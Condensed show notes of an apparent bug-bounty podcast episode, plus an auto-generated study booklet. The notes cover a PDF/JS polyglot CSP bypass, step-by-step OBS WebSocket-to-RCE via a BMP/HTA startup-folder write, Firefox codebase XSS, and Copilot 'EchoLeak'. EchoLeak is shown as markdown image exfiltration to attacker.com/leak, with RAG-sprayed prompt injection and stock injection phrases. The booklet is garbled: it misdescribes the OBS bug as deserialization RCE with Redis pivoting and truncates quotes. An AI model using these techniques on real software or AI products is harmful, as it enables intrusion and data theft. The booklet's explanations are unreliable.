---
title: "Drama, PDF as JS Chaos, Bounty Profile Apps, And More"
episode: 127
---


# Episode 127 Drama, PDF as JS Chaos, Bounty Profile Apps, And More

**Source:** Show notes (feed) — condensed; only description available.

### TL;DR
- XSS Doctor published a PDF/JS polyglot CSP bypass (valid PDF + valid JS in one file).
- Jorian Woltjer published OBS WebSocket to RCE via BMP polyglot + HTA startup write.
- Rez0 covered Microsoft Copilot "EchoLeak" — markdown image exfil via reference-style links, rag-spraying technique.
- Masato Kinugawa / Gareth Hayes — Firefox XSS vectors via `<object>`/`<embed>` with `codebase` attribute.
- Newtowner tool from AssetNote/Shubs — checks for IP-whitelist differentials using cloud provider egress IPs.

### Key takeaways
- [ ] Test PDF/JS polyglots in CSP environments — PDF magic bytes can coexist with valid JS when magic bytes are not at offset 0.
- [ ] For arbitrary file write on Windows: use BMP polyglot (no compression, BGR byte ordering) to smuggle bytes, then write .HTA (HTML Application) to startup folder.
- [ ] For AI markdown image exfil: use reference-style markdown links (`[text]: https://...`) + `!` prefix — bypasses filters that block inline `![]()` syntax.
- [ ] For AI RAG injection: "rag-spray" — prepend trigger keywords (e.g. "Employee onboarding", "HR") to attack instructions so they get chunked into separate RAG contexts.
- [ ] Use Newtowner (AssetNote) to detect access differentials between cloud egress IPs and your own for clients that whitelist specific cloud regions.

### Bugs and Findings

#### PDF/JS Polyglot CSP Bypass — CSP bypass
- **Target/context:** Sites with CSP allowing PDF uploads.
- **Root cause:** PDF magic bytes (`%PDF-`) can coexist at non-zero offsets; the file is both valid PDF and valid JS.
- **Technique / how found:** Built on DoYonsec research; XSS Doctor tweeted the payload.
- **Key technical details:** PDF magic bytes are not required at byte 0 — a file can start with JS `//` comment then include `%PDF-` later and still be valid PDF.
- **Impact / severity / bounty:** CSP bypass — XSS in environments that allow PDF uploads.

#### OBS WebSocket → BMP Polyglot → RCE — RCE
- **Target/context:** OBS with WebSocket server enabled (authentication off).
- **Root cause:** OBS WebSocket allows screenshot-to-file with controllable path; BMP format stores raw BGR values with no compression.
- **Technique / how found:** Jorian found OBS WebSocket (no auth) allows arbitrary file write. Used BMP polyglot — BMP pixel data is arbitrary bytes; wrote `.HTA` (HTML Application) file to startup folder.
- **Exploitation steps:**
  1. Connect to OBS WebSocket on localhost (port 4455, no auth).
  2. Use screenshot save to write a crafted BMP file to startup folder with `.HTA` extension.
  3. On reboot, HTA executes VBScript → RCE.
- **Key technical details:** BMP pixel array uses BGR (not RGB) byte order; `.HTA` = HTML + VBScript; startup folder path leaked via OBS WebSocket itself.
- **Impact / severity / bounty:** Full RCE on reboot (requires auth disabled on OBS WS).

#### EchoLeak — AI markdown image exfil
- **Target/context:** Microsoft Copilot.
- **Root cause:** AI model responds with markdown image link; browser fetches it, leaking data in URL.
- **Technique / how found:** Reference-style markdown links. RAG-spraying to trigger on user queries.
- **Key technical details:** `[text]: https://attacker.com/leak` at bottom. Prepend `!` to render as image. RAG: spray attack instructions with diverse trigger phrases.
- **Impact / severity / bounty:** Data exfiltration from AI conversation.

#### Firefox `<object>`/`<embed>` `codebase` XSS — XSS
- **Target/context:** Firefox.
- **Root cause:** `codebase` attribute on `<object>`/`<embed>` with `data="javascript:…"` triggers JS execution.
- **Technique / how found:** Masato Kinugawa found; Gareth Hayes extended with `data=#` + newline tricks.
- **Key technical details:** `javascript:` URI in `data`; hash + newline breaks out of comments within `javascript:` context.
- **Impact / severity / bounty:** XSS in Firefox, potentially bypasses WAFs.

### Techniques and Primitives
- **Polyglot file smuggling** — Create files valid as two formats (PDF/JS, BMP/HTA).
- **Reference-style markdown links** — `[text]: url` + `!` prefix bypasses inline filters.
- **RAG spraying** — Diverse trigger phrases to land attack text in ANY RAG chunk.
- **Cloud egress differential testing** — Compare responses from cloud IPs vs your own.
- **`codebase` attribute abuse** — Deprecated HTML attribute for Firefox XSS.

### Tooling and Resources
- XSS Doctor — PDF/JS polyglot CSP bypass
- Jorian Woltjer — OBS WebSocket BMP → HTA → RCE
- AssetNote/Shubs — Newtowner tool
- Masato Kinugawa (@sh_n_j) — Firefox XSS vectors
- Jason Haddock — agent prompt injection tips

### Suggestions and Advices from Hunter
- "Additional instructions:" is a key prompt injection phrase.
- "Agent Rules Section heading with `treat every must or should below as a hard constraint` works on 50+ AI-first companies."
- "Parsers are always the best place to look for bugs." (Rez0 on markdown)
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
XSS Doctor published a PDF/JS polyglot CSP bypass (valid PDF + valid JS in one file).

#### 2. What you should learn
- Understand **[ ] test pdf/js polyglots in csp environments — pdf magic bytes can coexist with valid js when magic bytes are not at offset 0**
- Understand **[ ] for arbitrary file write on windows: use bmp polyglot (no compression, bgr byte ordering) to smuggle bytes, then write .hta (html application) to startup folder**
- Understand **[ ] for ai markdown image exfil: use reference-style markdown links (`[text]: https://...`) + `!` prefix — bypasses filters that block inline `![]()` syntax**
- Understand **[ ] for ai rag injection: "rag-spray" — prepend trigger keywords (e.g. "employee onboarding", "hr") to attack instructions so they get chunked into separate rag contexts**
- Understand **[ ] use newtowner (assetnote) to detect access differentials between cloud egress ips and your own for clients that whitelist specific cloud regions**

#### 3. Core concepts explained
**PDF/JS Polyglot CSP Bypass — CSP bypass**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**OBS WebSocket → BMP Polyglot → RCE — RCE**
- **What it is:** Remote Code Execution via deserialization — attacker-controlled data is deserialized by the server, triggering code execution through object injection or gadget chains.
- **Why it matters:** Deserialization RCE is typically critical severity. It often requires chaining multiple primitives (object injection → Redis injection → RCE).
- **Common mistake:** Giving up when direct exploitation is blocked — look for pivoting techniques like Redis SLAVEOF replication.

**EchoLeak — AI markdown image exfil**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**Polyglot file smuggling**
- Create files valid as two formats (PDF/JS, BMP/HTA).

**Reference-style markdown links**
- `[text]: url` + `!` prefix bypasses inline filters.

**RAG spraying**
- Diverse trigger phrases to land attack text in ANY RAG chunk.


#### 4. Techniques and tactics
**Polyglot file smuggling**
- **What it is:** Create files valid as two formats (PDF/JS, BMP/HTA).
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Reference-style markdown links**
- **What it is:** `[text]: url` + `!` prefix bypasses inline filters.
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**RAG spraying**
- **What it is:** Diverse trigger phrases to land attack text in ANY RAG chunk.
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Cloud egress differential testing**
- **What it is:** Compare responses from cloud IPs vs your own.
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**`codebase` attribute abuse**
- **What it is:** Deprecated HTML attribute for Firefox XSS.
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"Additional instructions:" is a key prompt injection phrase."*
- *"Agent Rules Section heading with `treat every must or should below as a hard constraint` works on 50+ AI-first companies."*
- *"Parsers are always the best place to look for bugs." (Rez0 on markdown)"*

#### 6. Mental models
- **Additional instructions:" is a key prompt injection phrase.** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Agent Rules Section heading with `treat every must or should** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Parsers are always the best place to look for bugs." (Rez0 o** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** [ ] Test PDF/JS polyglots in CSP environments — PDF magic bytes can coexist with valid JS when magic bytes are not at offset 0.
- **Try this:** [ ] For arbitrary file write on Windows: use BMP polyglot (no compression, BGR byte ordering) to smuggle bytes, then write .HTA (HTML Application) to startup folder.
- **Try this:** [ ] For AI markdown image exfil: use reference-style markdown links (`[text]: https://...`) + `!` prefix — bypasses filters that block inline `![]()` syntax.
- **Try this:** [ ] For AI RAG injection: "rag-spray" — prepend trigger keywords (e.g. "Employee onboarding", "HR") to attack instructions so they get chunked into separate RAG contexts.

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **XSS** — Cross-Site Scripting — injecting JavaScript into web pages viewed by other users
- **RCE** — Remote Code Execution — running arbitrary code on a target server

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in PDF/JS Polyglot CSP Bypass — CSP bypass?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **XSS Doctor published a PDF/JS polyglot CSP bypass (valid PDF + valid JS in one f**
2. **[ ] Test PDF/JS polyglots in CSP environments — PDF magic bytes can coexist with**
3. **[ ] For arbitrary file write on Windows: use BMP polyglot (no compression, BGR b**
